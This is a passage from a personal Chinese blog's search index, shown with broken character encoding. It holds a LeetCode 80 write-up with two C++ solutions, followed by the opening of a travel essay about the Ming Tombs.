è§£é‡Šï¼š å‡½æ•°åº”è¿”å›æ–°é•¿åº¦ length = 5, å¹¶ä¸”åŸæ•°ç»„çš„å‰äº”ä¸ªå…ƒç´ è¢«ä¿®æ”¹ä¸º 1, 1, 2, 2, 3 ã€‚ ä¸éœ€è¦è€ƒè™‘æ•°ç»„ä¸­è¶…å‡ºæ–°é•¿åº¦åé¢çš„å…ƒç´ ã€‚ ç¤ºä¾‹2\nè¾“å…¥ï¼š nums = [0,0,1,1,1,1,2,3,3] è¾“å‡ºï¼š 7, nums = [0,0,1,1,2,3,3] æ•°æ®èŒƒå›´\n1 \u0026lt;= nums.length \u0026lt;= 3 * 104 -104 \u0026lt;= nums[i] \u0026lt;= 104 nums å·²æŒ‰å‡åºæ’åˆ— åˆ†æ æ›´æ–°åšå®¢ä¸»é¢˜ç¬¬ä¸€ç¯‡~ åˆ†æéƒ¨åˆ†ä¸ç”¨ \u0026gt; åŒ…èµ·æ¥äº† ãƒ½(ï¿£â–½ï¿£)ï¾‰\nä¸€é“ä¹çœ‹ç®€å•ï¼Œç»†æƒ³éº»çƒ¦çš„é¢˜ç›®ï¼Œæ”¾åœ¨ é”™é¢˜æœ¬ è¿™ä¸ªåˆ†ç±»é‡Œï¼Œä¸»è¦æ˜¯ç”±äºæœ´ç´ çš„æš´åŠ›åšæ³•æ˜¯èƒ½é€šè¿‡çš„ã€‚å½“ç„¶ï¼Œé¢˜è§£é‡Œé¢çš„æƒ³æ³•æ›´ä¸ºå¼ºå¤§ï¼Œå½“ç„¶ï¼Œå¹¶ä¸æ˜¯ç‰¹åˆ«éš¾æƒ³ï¼Œä½†æ˜¯ç»†èŠ‚æ˜¯è¾ƒå¤šçš„ï¼Œä¹Ÿæ˜¯æœ¬æ¬¡é”™å¾—æœ€å¤šçš„åœ°æ–¹ã€‚\næœ´ç´ åšæ³• è¿™æ˜¯æˆ‘æœ€åˆçš„æƒ³æ³•ã€‚æ ¹æ®é¢˜æ„ï¼Œæœ€ç»ˆç›¸åŒçš„æ•°å­—æœ€å¤šåªæœ‰ ä¸¤ä¸ª ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªæŒ‡é’ˆå‘å‰ç§»åŠ¨ï¼Œå½“å®ƒå’Œå®ƒçš„ ä¸‹ä¸€ä½ å…ƒç´ å€¼ç›¸åŒæ—¶ï¼Œå®ƒçš„ ä¸‹ä¸‹ä½ å…ƒç´ çš„æ•°å€¼å°±å¿…é¡»å’Œå®ƒä¸åŒäº†ã€‚å³ï¼Œå½“æˆ‘ä»¬å‘åçœ‹å»ï¼Œå‘ç°ä¸‹ä¸€ä¸ªå…ƒç´ ä¸å½“å‰å…ƒç´ ç›¸åŒæ—¶ï¼Œå¯ä»¥ç›´æ¥ç¡®å®šä¸‹ä¸‹ä½å…ƒç´ çš„å€¼ï¼›å¹¶ä¸”ç¡®å®šäº†ä¹‹åï¼Œéœ€è¦ä»ç¡®å®šçš„ç‚¹å¼€å§‹ï¼Œå°†åé¢çš„å…ƒç´ éƒ½å‘å‰ç§»åŠ¨ã€‚\nç¤ºæ„å›¾1 ç§»åŠ¨ä¹‹åï¼Œè¿˜éœ€è¦è¿›è¡Œ pop_back() çš„æ“ä½œã€‚\nè¿™å°±è·Ÿä»ä¸€ä¸ªæœ‰åºæ•°ç»„ä¸­åˆ é™¤æ•°æ®ä¸€æ ·ï¼Œæˆ‘ä»¬åˆ é™¤çš„æ˜¯ä¸€æ®µé‡å¤çš„æ•°æ®ï¼Œè¦å°†åé¢çš„ä¸œè¥¿å‘å‰ç§»åŠ¨ï¼Œè¦†ç›–æ‰è¿™ä¸€æ®µã€‚\nè¿™ç§æ€è·¯ä¸‹ï¼Œé™åˆ¶æ¡ä»¶å°±å¾ˆå¤šäº†ï¼š\nQï¼šå½“å‰å…ƒç´ æ²¡æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ æ€ä¹ˆåŠ Aï¼šè¯´æ˜å®ƒåˆ°è¾¾äº†æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¾ªç¯ç»“æŸ Qï¼šå¯»æ‰¾ä¸‹ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™æœ‰å“ªäº›æ³¨æ„ç‚¹ Aï¼šä½¿ç”¨ä¸€ä¸ªæŒ‡é’ˆå‘åå¯»æ‰¾ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå½“å®ƒä¸è¶Šç•Œä¸”ä¸å½“å‰å…ƒç´ ä»ç„¶ç›¸ç­‰çš„æ—¶å€™ï¼Œç»§ç»­å‘åç§»åŠ¨ï¼›å½“è¿™ä¸€ä¸ªå¾ªç¯é€€å‡ºä¹‹åï¼Œè¯´æ˜å‡ ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬æ‰¾åˆ°äº†ä¸‹ä¸€ä¸ªå…ƒç´ æˆ–è€…ä¹‹åæ²¡æœ‰ç¬¦åˆæ¡ä»¶çš„å…ƒç´ ï¼Œåœ¨è¿™é‡Œè¿˜éœ€è¦è¿›è¡Œä¸€æ¬¡åˆ¤æ–­ ä¸å¾—ä¸è¯´ï¼Œæˆ‘æœ€å¼€å§‹ã€æœ€æœ´ç´ çš„æƒ³æ³•åè€Œç‰¹åˆ«çš„å¤æ‚ï¼Œæ ¹æ®ä¸Šé¢çš„å†…å®¹èƒ½å†™å‡ºå¦‚ä¸‹çš„ä»£ç ï¼š\nACä»£ç 1 class Solution { public: int removeDuplicates(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt;::iterator p_now; vector\u0026lt;int\u0026gt;::iterator p_next; vector\u0026lt;int\u0026gt;::iterator p_tmp; int res, num_now; for (p_now = nums.begin(); p_now \u0026lt; nums.end(); ) { if (p_now == nums.end() - 1) { p_now++; break; } if (*p_now == *(p_now + 1)) { num_now = *p_now; p_now += 2; p_next = p_now; // get next num different from now while (p_next \u0026lt; nums.end() \u0026amp;\u0026amp; *p_next == num_now) { p_next++; } // next position is valid if (p_next \u0026lt; nums.end() \u0026amp;\u0026amp; p_next != p_now) { p_tmp = p_now; int diff = p_next - p_now; while (p_next \u0026lt; nums.end()) { *p_tmp = *p_next; p_next++; p_tmp++; } while (diff-- \u0026gt; 0) { nums.pop_back(); } } // next position is invalid else if (p_next == nums.end()) { break; } } else { p_now++; } } // cout \u0026lt;\u0026lt; *p_now \u0026lt;\u0026lt; endl; res = p_now - nums.begin(); while (nums.size() \u0026gt; res) { nums.pop_back(); } return res; } }; å¤§å‡ åè¡Œçš„ä»£ç ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„äº† -_-||\nå¯¹äºåŸåœ°ä¿®æ”¹æ¥è¯´ï¼Œæˆ‘çš„ pop_back() æ“ä½œå®é™…ä¸Šæ˜¾å¾—å¤šä½™ï¼Œè¡¨ç°æ˜¯å¾ˆä¸€èˆ¬çš„ï¼š\nPerformance1 åŒæŒ‡é’ˆ å¯¹äºä¸Šé¢çš„åšæ³•ï¼Œå‘åçœ‹ çš„æ€æƒ³ä½¿å¾—æˆ‘å¯¹äºå¾ªç¯è¾¹ç•Œæ¡ä»¶çš„åˆ¤æ–­æ¯”è¾ƒå›°éš¾ï¼Œå› ä¸ºæˆ‘ä»¬æ€»æ˜¯è¦è€ƒè™‘å½“å‰å…ƒç´ çš„ ä¸‹ä¸€ä½ ã€ ä¸‹ä¸‹ä½ ï¼Œå¾ˆå®¹æ˜“å°±äº§ç”Ÿè¶Šç•Œçš„é—®é¢˜ã€‚\nå¦‚æœ å‘å‰çœ‹ ï¼Œæ€ä¹ˆåšå‘¢ï¼Ÿ\nåŒæŒ‡é’ˆçš„æ€æƒ³æ˜¯ï¼Œä½¿ç”¨ å¿«æ…¢æŒ‡é’ˆ ï¼Œæ…¢æŒ‡é’ˆ slow æŒ‡å‘å½“å‰çš„ä½ç½®ï¼Œå¿«æŒ‡é’ˆ fast æŒ‡å‘å½“å‰ä½ç½® åº”è¯¥å¡«å…… çš„å…ƒç´ ï¼›å‘å‰çœ‹å»ï¼Œå½“ *slow == *(slow - 2) æ—¶ï¼Œç»§ç»­ç§»åŠ¨ fast è€Œä½¿ slow ä¿æŒä¸åŠ¨ï¼Œç›´åˆ°ç¬¦åˆ *slow != *fast ï¼Œå³æ”¹å˜å½“å‰å…ƒç´ çš„å€¼ä½¿å¾—å®ƒä¸å†ä¸ä¹‹å‰çš„å…ƒç´ ç›¸åŒã€‚\nåƒè¨€ä¸‡è¯­ä¸å¦‚ä¸€å¼ GIFï¼ˆè¯·ç‚¹å¼€å®ƒï¼‰ï¼š\nTets æ³¨æ„å½“ slow æŒ‡å‘äº†ç¬¬ä¸‰ä¸ª 2 çš„æ—¶å€™ï¼Œ*slow == *(slow - 2) ï¼Œåˆ™ slow ä¸å†ç»§ç»­å‰ç§»ï¼Œåªç§»åŠ¨ fast ï¼Œä¸”åªå½“ *fast ï¼= *slow çš„æ—¶å€™æ‰ä¼šç»§ç»­ç§»åŠ¨ slow ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œå°† *slow æ›´æ–°ä¸º 3 ä¹‹åï¼Œ fast å’Œ slow éƒ½è¦ç»§ç»­ç§»åŠ¨ï¼Œç„¶è€Œ fast å·²ç»èµ°å®Œäº†æ•´ä¸ªæ•°ç»„ï¼Œæ•…å¾ªç¯ç»“æŸäº†ã€‚\nç”±æ­¤å†™å‡ºACä»£ç 2.\nACä»£ç 2 class Solution { public: int removeDuplicates(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt;::iterator slow; vector\u0026lt;int\u0026gt;::iterator fast; slow = nums.begin(); for (fast = nums.begin(); fast \u0026lt; nums.end(); fast++) { *slow = *fast; if (slow \u0026lt; nums.begin() + 2) { slow++; continue; } if (*slow == *(slow - 2) \u0026amp;\u0026amp; *slow == *fast) { // do not add slow // cout \u0026lt;\u0026lt; *slow \u0026lt;\u0026lt; \u0026#34; == \u0026#34; \u0026lt;\u0026lt; *fast \u0026lt;\u0026lt; endl; // cout \u0026lt;\u0026lt; slow - nums.begin() \u0026lt;\u0026lt; endl; continue; } slow++; } /* for (vector\u0026lt;int\u0026gt;::iterator tmp = nums.begin(); tmp != slow; tmp++) { cout \u0026lt;\u0026lt; *tmp \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;Ret: \u0026#34; \u0026lt;\u0026lt; slow - nums.begin() \u0026lt;\u0026lt; endl; */ return slow - nums.begin(); } }; æˆ‘å°†è°ƒè¯•ä»£ç éƒ½ç•™åœ¨äº†æ­¤å¤„ï¼Œè¿™æ˜¯å› ä¸ºACä»£ç ä¸­æœ‰ä¸€æ­¥ç»†èŠ‚éœ€è¦æ³¨æ„ï¼š\nfor (fast = nums.begin(); fast \u0026lt; nums.end(); fast++) { *slow = *fast; // --- snip --- } fast çš„æ¯ä¸€æ­¥ç§»åŠ¨éƒ½è¦ä¼´éšç€ slow çš„æ›´æ–°ï¼Œå¹¶ä¸éœ€è¦å…³æ³¨ slow æ»¡è¶³ä»€ä¹ˆæ¡ä»¶ã€‚ä»…å½“ slow ä¸å®ƒçš„ä¸Šä¸Šä½ä¸åŒçš„æ—¶å€™æ‰ä¼šç»§ç»­ç§»åŠ¨ï¼Œå› æ­¤ä¸å¿…æ‹…å¿ƒèµ‹å€¼å‡ºç°ä»€ä¹ˆé—®é¢˜ã€‚è¿™ä¸€æ­¥å¯æ˜¯æˆ‘WAäº†ä¸‰æ¬¡æ‰å¾—åˆ°çš„æƒ¨ç—›æ•™è®­ï¼\nPerformance2 å‚è€ƒèµ„æ–™ [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.åˆ é™¤æ’åºæ•°ç»„ä¸­çš„é‡å¤é¡¹ II[EB/OL].2021-04-05\nhttps://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/shan-chu-pai-xu-shu-zu-zhong-de-zhong-fu-yec2/\n[2] è´Ÿé›ªæ˜çƒ›.ã€è´Ÿé›ªæ˜çƒ›ã€‘åŠ¨ç”»é¢˜è§£ï¼Œå¸®åŠ©ç†æ¸…æ€è·¯[EB/OL].2021-04-06\nhttps://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/fu-xue-ming-zhu-dong-hua-ti-jie-bang-zhu-yrx5/\n","date":"2021-04-06T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode80.-%E5%88%A0%E9%99%A4%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E9%A1%B9-ii/","title":"é”™é¢˜æœ¬ | LeetCode80. åˆ é™¤æœ‰åºæ•°ç»„ä¸­çš„é‡å¤é¡¹ II"},{"content":"å‰å¥ ä¸Šå‘¨ä¾¿è®¡åˆ’ç€åˆ©ç”¨æ¸…æ˜å‡æœŸå‡ºé—¨æ¸¸ç©ï¼Œè€Œä¸€å‘¨åŠ³ç´¯ä¹‹åï¼Œæ¸¸å…´é¡¿èµ·ï¼Œå†éš¾æ”¶æ‹¾ã€‚æ˜¨å¤©åˆ°äº†çº¦å¥½çš„æ—¶é—´ï¼Œèˆå‹å´æ²¡åŠæ³•ä»åºŠä¸Šèµ·æ¥ï¼Œæˆ‘æ— å¿ƒå†ä½œæ‹–å»¶ï¼Œç‹¬è‡ªä¸€äººè¸ä¸Šäº†å»å¾€æ˜åä¸‰é™µçš„è·¯ç¨‹ã€‚\næ­¤å‰å¹¶æœªåšè¯¦ç»†çš„è·¯çº¿è°ƒç ”ï¼Œåªè§‰å¾—æ—¢ç„¶æ˜Œå¹³çº¿ä¸Šæœ‰åä¸‰é™µç«™ï¼Œæ€»ä¸ä¼šéª—æˆ‘æ‰æ˜¯ã€‚åœ¨åä¸‰é™µç«™ä¸‹è½¦ï¼Œèµ°å‡ºç«™é—¨èµ«ç„¶æ˜¯ä¸€ç‰‡è’èŠœé—­å¡çš„å°åœ°æ–¹ã€‚åä¸‰é™µï¼Œåˆ°ç°åœ¨è¿˜æ˜¯åˆ‡åˆ‡å®å®çš„éƒŠåŒºã€‚æˆ‘å¯¹åŒ—æ–¹å†œæ‘ä¸€ç›´ä»¥æ¥çš„çƒ­æƒ…åœ¨æ­¤åˆ»ä¹Ÿè¢«ä¸€å¹¶æ¿€å‘å‡ºæ¥ï¼Œä¾¿æ— è§†äº†åœ°é“ç«™å£é‚£è®¸å¤šçš„æ½å®¢å¸æœºï¼Œç‹¬è‡ªå‘ç€åä¸‰é™µçš„æ–¹å‘èµ°å»ã€‚\nå¤©æ°”å®åœ¨å¤ªå¥½äº†ã€‚æ™´ç©ºä¸‡é‡Œæ— ä¸€ç‰©ï¼Œå¹é¢ä¸å¯’æ¨æŸ³é£ã€‚åŒ—æ–¹çš„æ˜¥å¤©ä¸å—æ–¹å¤§ä¸ç›¸åŒï¼Œç»å†äº†æ— æ¯”æ®‹é…·çš„ä¸¥å¯’ä¹‹åï¼Œè¿™ä¸ªä¸–ç•Œå¼€å§‹å€¾å…¶æ‰€æœ‰æ¸©æŸ”æ¥å“ºè‚²ä¸‡ç‰©ã€‚åŒ—æ–¹çš„å†œæ‘ä¹Ÿä¸å—æ–¹å¤§ä¸ç›¸åŒï¼Œå®ƒç»™æˆ‘çš„æ„Ÿè§‰æ˜¯æ›´ä¸ºå¼€é˜”ã€æ›´ä¸ºè‚ƒç©†ï¼Œæ¨æŸ³çš„é˜´å½±åœ¨è€å±‹çš„ç¡¬å±±é¡¶ä¸ŠæµåŠ¨ï¼Œç ´ç¢çš„çŸ³æ¿è·¯å’Œå®½é˜”çš„æŸæ²¹è·¯äº¤æ›¿è¿°è¯´ç€è¿™ä¸€ç‰‡æ‘è½çš„å…´è¡°ã€‚æˆ‘çš„å®¶ä¹¡â€”â€”é—½å—çš„æ‘è½æˆ‘æ˜¯å¾ˆå–œæ¬¢çš„ï¼Œå¤§æŠµç”±äºå®—æ³•çš„ç››è¡Œï¼Œé‚»èˆä¹‹é—´çš„å¸ƒå±€æ›´åŠ çš„ç´§å¯†ï¼Œæ€»æ˜¯ç»™äººä¸€ç§çƒ­é—¹è€Œå›¢ç»“çš„æ°›å›´ï¼Œä½†ä»æ°”è´¨è€Œè¨€ï¼Œåˆ™ç¨é€Šäºæ­¤å¤„äº†ã€‚\næ²¿ç€æ¶§å¤´æ‘çš„æ‘é“èµ°ç€ï¼Œèµ°ä¸Šäº†æ˜Œèµ¤è·¯ï¼Œåä¸‰é™µçš„åœ°ç•Œå·²ç„¶åœ¨æˆ‘çš„æ­£å‰æ–¹äº†ã€‚ä¸€è·¯èµ°è¿‡ï¼Œæ‰€é‡åˆ°çš„éª‘è¡Œè€…ä¸å¯èƒœæ•°ï¼Œé¢‡è§‰é¦–éƒ½çš„æ–‡ä½“æ´»åŠ¨ç¡®å®æ˜¯éå¸¸å‘è¾¾ï¼Œä¸ç¦ç¾¡æ…•èµ·äº†ç”Ÿé•¿äºæ­¤åœ°çš„äººä»¬ï¼Œåœ¨ä»–ä»¬æœ€ç¾å¥½çš„å¹´åé‡Œï¼Œæ¯å¹´éƒ½èƒ½åœ¨è¿™ä¹ˆèˆ’çˆ½çš„æ˜¥æ°”ä¸­é©°éª‹åœ¨å¹³æ•´çš„ä¹¡é“ä¸Šï¼Œæ¢è®¿é‚£äº›å†å²æ‚ ä¹…çš„åœ°æ–¹ã€‚\næ²¿ç€æ˜Œèµ¤è·¯ç›´è¡Œæ•°ååˆ†é’Ÿï¼Œåˆ°è¾¾äº†å¤§å®«é—¨é™„è¿‘ã€‚åœ¨è·¯è¾¹çš„å†œå®¶é¤é¦†ä¸­éšä¾¿åº”ä»˜ï¼Œç¨ä½œæ­‡æ¯ä¾¿å¼€å¯äº†æ¸¸è§ˆåä¸‰é™µçš„è¿›ç¨‹ã€‚å¤§å®«é—¨æœ¬æ˜¯ç¥é“çš„å…¥å£ï¼Œå´ç”±äºæ™¯åŒºçš„æ–½å·¥è€Œæš‚æ—¶å°é—­ã€‚æˆ‘åªå¾—é‡æ–°å›åˆ°é©¬è·¯ï¼Œç»§ç»­æœç€ç¥é“çš„æ–¹å‘èµ°å»ã€‚\nç¥é“ ç¥é“æ˜¯å¸ç‹å’Œç™¾å®˜å‰å¾€ç¥­ç¥€çš„èµ·ç‚¹ï¼Œä»–ä»¬æ€»è¦åœ¨è¿™ä¹ˆä¸€æ¡é•¿è€Œä¸å•è°ƒçš„é“è·¯ä¸Šè¡Œè¿›ç€ï¼Œé…é…¿å‡ºå¯¹å…ˆç¥–çš„æ— æ¯”çœŸæŒšçš„æ•¬æ„æ¥ã€‚\nä»å…¥é—¨å¼€å§‹ä¾¿æ˜¾å‡ºäº†åº„é‡ã€‚å€˜è‹¥å¸ç‹ä¹Ÿäºæ¸…æ˜æ¥ç¥­æ‹œç¥–å…ˆï¼Œåˆ™æˆ‘ä»¬çœ‹åˆ°çš„æ™¯è±¡æ˜¯ä¸€æ ·çš„ï¼šè¿ˆè¿‡äº†é—¨æ§›ï¼Œèµ°å‡ºæ·±åšè€Œä½çŸ®çš„é—¨ï¼Œä¾¿æ˜¯å¤©åœ°å¼€é˜”ã€æ¨æŸ³è½»èˆã€çŸ³åƒè§„æ•´ã€åœ°ç –ä¸¥å¯†çš„ç¥é“ã€‚å¤äººç¡®ä¹æ˜¯äº‹æ­»å¦‚ç”Ÿï¼Œå…ˆå¸æ‰€å–œé—»ä¹è§çš„ç‘å…½ã€è¯¤è‡£ï¼Œä¹Ÿéƒ½è¦åŒ–ä½œäº†çŸ³åƒï¼Œåœ¨è¿™æ¡é•¿é•¿ç›´ç›´çš„ç¥é“ä¸Šæ°¸ä¹…åœ°é™ªä¼´ç€ä»–ä»¬çš„é­‚çµã€‚å‡¡æ­¤ä¸€ç±»è¡¨å¾æ€§çš„ä¸œè¥¿ï¼Œæ˜¯å¦èƒ½ä½¿å…ˆå¸å®‰æ¯å€’æ˜¯è¿˜ä¸å¯çŸ¥ï¼Œèƒ½ä½¿åæ¥çš„æ‹œç¥­è€…äº§ç”Ÿå‡ºè‡ªè¶³è€Œå‡é‡çš„æƒ…ç»ªææ€•æ˜¯ä¸€å®šçš„äº†ã€‚\nä¹Ÿè®¸åœ¨å‡ ç™¾å¹´å‰çš„æŸä¸ªæ¸…æ˜ï¼ŒæŸä½å¸ç‹å°±è¿™ä¹ˆé™é»˜åœ°èµ°åœ¨è¿™æ¡ç¥é“ä¸Šï¼Œè¿½æ€å…ˆå¸çš„ç§ç§ï¼Œä¹Ÿå†¥æƒ³ç€å…³äºå¤©ä¸‹ç™¾å§“çš„ç§ç§ã€‚\näº¦ä¹Ÿè®¸åœ¨å‡ ç™¾å¹´å‰çš„æŸä¸ªæ¸…æ˜ï¼ŒæŸä½å¸ç‹å¸¦ç€ä»–çš„å¦ƒå«”ï¼Œè„šæ­¥è½»å¿«åœ°åœ¨è¿™é‡Œå‰è¡Œï¼Œèµ¶ç´§å®Œæˆäº†ç¥­ç¥€ï¼Œè¿˜æœ‰ç››å¤§çš„å®´ä¼šåœ¨ç­‰ç€ä»–å‘¢ã€‚\nå®šé™µ ä»ç¥é“å‡ºå»ï¼Œè·ç¦»çœŸæ­£çš„é™µå¯è¿˜æœ‰å¾ˆè¿œçš„è·ç¦»ã€‚æˆ‘åœ¨æ˜Œèµ¤è·¯ä¸Šç»§ç»­è¡Œè¿›äº†å‡ ç™¾ç±³ï¼Œæ‰“å¼€åœ°å›¾ä¸€çœ‹ï¼Œææ€•å‡ å…¬é‡Œçš„è·¯ç¨‹ç”¨è„šèµ°ä¸‹æ¥ï¼Œæ—¶é—´çš„èŠ±è´¹æ˜¯åƒä¸æ¶ˆçš„äº†ã€‚åœ¨æ˜Œå¹³èƒ¡åº„ç«™ä¸Šäº†å…¬äº¤ï¼Œåœ¨æ‹¥æŒ¤çš„é“è·¯ä¸Šèµ°èµ°åœåœï¼Œæ€»ç®—æ˜¯æ¥åˆ°äº†å®šé™µã€‚\nå®šé™µæ˜¯ä¸‡å†çš‡å¸çš„é™µå¯ï¼Œä¸€ä½å‡ åå¹´ä¸ä¸Šæœçš„çš‡å¸ï¼Œå¯¹äºè‡ªå·±èº«åçš„ä½æ‰€å€’æ˜¯éå¸¸ä¸Šå¿ƒã€‚å®«æ®¿çš„è§„åˆ¶è¿˜æ˜¯å¾ˆä¸¥æ ¼çš„ï¼Œä»å…¥é—¨å¼€å§‹ï¼Œè¿‡ç¥¾æ©é—¨ã€ç¥¾æ©æ®¿ï¼ˆå‡è¢«ç„šæ¯ï¼‰ï¼Œæ¥åˆ°æ£‚æ˜Ÿé—¨å’Œæ˜æ¥¼ã€‚æ˜æ¥¼è„šä¸‹çš„ä¸¤ä¸ªåæ®¿ä¸­æ­£åœ¨å±•å‡ºå®šé™µåœ°å®«å‡ºåœŸçš„æ–‡ç‰©ï¼Œæˆ‘åœ¨å±•å…å†…èå…¥äº†ä¸€ä¸ªå¯¼æ¸¸å›¢ï¼Œå¬å¯¼æ¸¸è®²è§£å®šé™µçš„æ•…äº‹ã€‚\nå»ºå›½åˆæœŸï¼Œè€ƒå¤ä¸“å®¶ä»¬æœ¬æ¬²å‘æ˜é•¿é™µï¼ˆæ°¸ä¹çš‡å¸æœ±æ££çš„é™µå¯ï¼‰ï¼Œä½†å¸é™µè§„åˆ¶å·¨å¤§ï¼Œé•¿é™µåˆæ˜¯å…¶ä¸­æœ€å¤§ï¼Œä¸“å®¶ä¸­æ²¡æœ‰ä¸€äººæœ‰è¿‡å‘æ˜æ­¤ç±»é™µå¯çš„ç»éªŒã€‚ç»è¿‡æ¢è®¨ï¼Œæœ€ç»ˆå†³å®šå‘æ˜è§„åˆ¶è¾ƒå°çš„å®šé™µï¼Œä¸ºé•¿é™µçš„å‘æ˜ç§¯æ”’ç»éªŒã€‚åœ¨å‘æ˜åˆæœŸï¼Œä¸“å®¶åœ¨ä¸€æ¡æ¢æ²Ÿä¸­æ‰¾åˆ°äº†æ˜æ¥¼ä¾§é¢çš„åœ°ä¸‹éš§é“ï¼Œæ²¿ç€æ­¤éš§é“çš„èµ°å‘æŒ–æ˜ç¬¬äºŒæ¡æ¢æ²Ÿï¼›åœ¨ç¬¬äºŒé“æ¢æ²Ÿå¤„æ‰¾åˆ°äº†ä¸€å—æŒ‡è·¯çŸ³ç¢‘ï¼Œæ ¹æ®çŸ³ç¢‘çš„è®°è½½æ·±æŒ–ç¬¬ä¸‰é“æ¢æ²Ÿï¼Œæ‰¾åˆ°äº†åœ°å®«çš„å¤§é—¨ã€‚è¿›å…¥åœ°å®«ï¼Œå…¶å¤§é—¨ç«Ÿæ˜¯ä»å†…éƒ¨é¡¶ä½çš„ï¼Œä¸“å®¶å“äº†ä¸€è·³ï¼Œè®¤ä¸ºè¿™è¯´æ˜äº†å½“æ—¶æœ‰æ´»äººæ®‰è‘¬â€”â€”æ´»äººä»å†…éƒ¨å°†å¤§é—¨é”ä¸Šä¹‹åï¼Œåœ¨åœ°å®«ä¸­è‡ªå†³ã€‚ç„¶è€Œå²æ–™è®°è½½åœ¨ä¸‡å†ä¹‹å‰å¾ˆä¹…å°±å·²ç»åºŸé™¤äº†æ´»äººæ®‰è‘¬çš„åˆ¶åº¦ï¼Œæ•…æ­¤å†…éƒ¨çš„é—¨å°ï¼Œåº”æ˜¯ç”¨äº†æŸäº›ç‰©ç†çš„åŠæ³•æ¥å®ç°ã€‚æ‰“å¼€åœ°å®«ï¼ŒæœçœŸå¹²å¹²å‡€å‡€ï¼Œæ²¡æœ‰å°¸éª¨ã€‚ä»–ä»¬é€æ­¥å‘å†…å‘æ˜ï¼Œè§åˆ°äº†ä¸‡å†çš‡å¸å®åº§ã€å­ç«¯çš‡åå®åº§å’Œå­é–çš‡åå®åº§ï¼›åæ®¿æ˜¯ä¸‰å…·æ£ºæ¤ï¼Œå·¦åæ®¿æ˜¯ä¸€å—çŸ³å°ï¼Œå½“ä¸­ä¸€å¤„é•¿æ–¹å½¢å¼€å£ï¼Œæ˜¯ä¸ºé‡‘äº•ï¼Œä¹ƒæ˜¯æ•´åº§å·¦åæ®¿çš„é£æ°´ç©´çœ¼ã€‚åæ®¿çš„é‡‘äº•æ­£åœ¨ä¸‡å†çš‡å¸æ£ºæ¤ä¸‹æ–¹ï¼Œæ•…æ— æ³•ç›®ç¹ï¼›å¦‚æ­¤ç©´çœ¼æ˜¯åœ°å®«å»ºç­‘çš„ä¸­å¿ƒï¼Œæ˜¯é£æ°´æœ€ä¸ºå…³é”®çš„åœ°æ–¹ï¼Œå¤äººç›¸ä¿¡ï¼Œè¿™ç±»ç©´çœ¼èƒ½ä½¿å¾—å¸ç‹æ­»åçš„å…ƒæ°”ç»§ç»­æŠ¤ä½‘å­å­™ä¸‡ä¸–ã€‚\næˆ‘ä»¬æ˜¯ä»å·¦åæ®¿è¿›å…¥åœ°å®«çš„ï¼Œå…ˆç§äº†ç§é‡‘äº•ï¼Œåè¿›å…¥æ­£æ®¿çœ‹äº†å®åº§ï¼Œåè§äº†ä¸‰å…·æ£ºæ¤ï¼Œæœ€åä»ç¬¬ä¸‰é“æ¢æ²Ÿä¸­ç»è¿‡åœ°å®«å¤§é—¨è€Œå‡ºã€‚åœ°å®«æœ‰ä¸€åƒå¤šå¹³æ–¹ç±³ï¼ŒåŠ ä¸Šå…ˆå‰çš„è®¸å¤šå»ºç­‘ï¼Œå¯ç®—å¾—æ˜¯ä¸€é¡¹å¾ˆå¤§çš„å·¥ç¨‹äº†ã€‚å¸ç‹å°†æ£ºæ¤ç½®äºé‡‘äº•ä¹‹ä¸Šï¼Œå¸Œæœ›è‡ªå·±çš„é¾™æ°”è«åŠå­å­™ï¼Œæ°¸ä¿æ±Ÿå±±ï¼Œè€Œä¸çŸ¥è‡ªå·±çš„ä¸€åº§é™µå¯ä½¿å¾—å­æ°‘ä»˜å‡ºäº†å¤šå°‘ï¼Œä½¿å¾—å›½å®¶ä»˜å‡ºäº†å¤šå°‘ã€‚åä¸‰åº§æ°”åŠ¿ç£…ç¤´çš„é™µå¯ï¼Œæ˜¯åä¸‰ä¸ªæœä»£äººæ°‘çš„è¡€æ±—å’Œç‰ºç‰²ï¼›çš‡å®¶çš„é‡‘äº•ç„å­¦ï¼Œåªæ˜¯å¸Œæœ›çš‡æƒæ°¸å›ºï¼Œè€Œéå¸Œæœ›å­æ°‘å®‰ä¹ã€‚æˆ–ä¸å¦‚è¯´ï¼Œä»å¸ç‹çš„ç”Ÿå‰åˆ°èº«åï¼Œæ•´ä¸ªæ— æ¯”é«˜çº§ã€æ— æ¯”ç²¾ç»†çš„ç¤¼åˆ¶ä½“ç³»ï¼Œæœ¬å°±å»ºç«‹åœ¨äººæ°‘çš„ä»˜å‡ºä¹‹ä¸Šï¼ŒåŸºäºå‹æ¦¨äººæ°‘çš„æ±Ÿå±±æ°¸å›ºçš„æ„¿æœ›ï¼Œæœ¬èº«å°±æ— æ³•å®ç°ï¼Œæ±Ÿå±±æ˜¯ä¸å¯é¿å…åœ°ä¼šä¸¢æ‰çš„ã€‚\nå¾ˆæœ‰è¶£çš„æ˜¯ï¼Œåœ°å®«ä¸­ä¸‰åº§å®åº§çš„é¢å‰éƒ½æ‘†ç€ä¸€ä¸ªé’èŠ±ç“·ç¼¸ï¼Œå†…éƒ¨åŸæœ¬æ˜¯ç››æ»¡äº†ç¯æ²¹ï¼Œç‚¹ç€é•¿æ˜ç¯çš„ã€‚é‚£å¾®å¼±çš„ç«ç„°è‡ªç„¶æ— æ³•åœ¨è¿™åœ°ä¸‹27ç±³çš„åœ°æ–¹é•¿æ˜ï¼Œå†ç»å‡ 